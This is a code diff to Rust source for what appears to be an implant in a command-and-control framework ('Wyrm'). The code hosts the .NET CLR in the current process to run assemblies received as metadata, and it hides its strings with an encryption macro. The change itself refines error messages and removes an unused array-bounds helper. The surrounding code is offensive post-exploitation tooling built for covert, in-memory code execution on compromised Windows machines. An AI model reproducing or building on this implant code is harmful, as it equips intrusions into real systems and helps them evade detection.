@@ -5,7 +5,7 @@ use str_crypter::{decrypt_string, sc};
 use windows_sys::{
     Win32::System::{
         ClrHosting::{CLRCreateInstance, CorRuntimeHost},
-        Com::{SAFEARRAY, SAFEARRAYBOUND},
+        Com::SAFEARRAY,
         Ole::{SafeArrayAccessData, SafeArrayCreateVector, SafeArrayUnaccessData},
         Variant::{VARIANT, VT_UI1},
     },
@@ -20,13 +20,41 @@ use crate::{
 };
 
 pub enum DotnetError {
-    BoundOverflow,
     ClrNotInitialised(i32),
     RuntimeNotInitialised(i32),
     CorHostNotInitialised(i32),
     CannotStartRuntime(i32),
     AssemblyDataNull,
     SafeArrayNotInitialised,
+}
+
+impl DotnetError {
+    fn to_string(&self) -> String {
+        match self {
+            DotnetError::ClrNotInitialised(i) => {
+                format!("{} {i:#X}", sc!("CLR was not initialised.", 73).unwrap())
+            }
+            DotnetError::RuntimeNotInitialised(i) => {
+                format!(
+                    "{} {i:#X}",
+                    sc!("Runtime was not initialised.", 73).unwrap()
+                )
+            }
+            DotnetError::CorHostNotInitialised(i) => {
+                format!(
+                    "{} {i:#X}",
+                    sc!("Cor Host was not initialised.", 73).unwrap()
+                )
+            }
+            DotnetError::CannotStartRuntime(i) => {
+                format!("{} {i:#X}", sc!("Cannot start runtime.", 73).unwrap())
+            }
+            DotnetError::AssemblyDataNull => sc!("_Assembly data was null", 73).unwrap(),
+            DotnetError::SafeArrayNotInitialised => {
+                sc!("SAFEARRAY could not be initialised", 73).unwrap()
+            }
+        }
+    }
 }
 
 const GUID_META_HOST: GUID = GUID {
@@ -76,13 +104,20 @@ pub fn execute_dotnet_current_process(metadata: &Option<String>) -> WyrmResult<S
     let deser = match serde_json::from_str::<DotExDataForImplant>(metadata.as_ref().unwrap()) {
         Ok(d) => d,
         Err(e) => {
-            return WyrmResult::Err(sc!("Could not deserialise metadata", 76).unwrap());
+            return WyrmResult::Err(format!(
+                "{} {e}",
+                sc!("Could not deserialise metadata", 76).unwrap()
+            ));
         }
     };
 
     match execute_dotnet_assembly(&deser.0) {
-        Ok(_) => WyrmResult::Ok(sc!("Assembly running..", 49).unwrap()),
-        Err(_) => WyrmResult::Err(sc!("Error received during execution", 56).unwrap()),
+        Ok(_) => WyrmResult::Ok(sc!("Assembly running.", 49).unwrap()),
+        Err(e) => WyrmResult::Err(format!(
+            "{} {}",
+            sc!("Error received during execution:", 56).unwrap(),
+            e.to_string()
+        )),
     }
 }
 
@@ -177,18 +212,6 @@ fn create_clr_instance() -> Result<*mut ICLRMetaHost, DotnetError> {
     }
 
     Ok(pp_interface as *mut ICLRMetaHost)
-}
-
-fn create_safe_array_bounds(len: usize) -> Result<SAFEARRAYBOUND, DotnetError> {
-    // Check we aren't going to overflow the buffer
-    if len > u32::MAX as usize {
-        return Err(DotnetError::BoundOverflow);
-    }
-
-    let mut bounds = SAFEARRAYBOUND::default();
-    bounds.cElements = len as u32;
-
-    Ok(bounds)
 }
 
 fn get_runtime_v4(meta: *mut ICLRMetaHost) -> Result<*mut ICLRRuntimeInfo, DotnetError> {
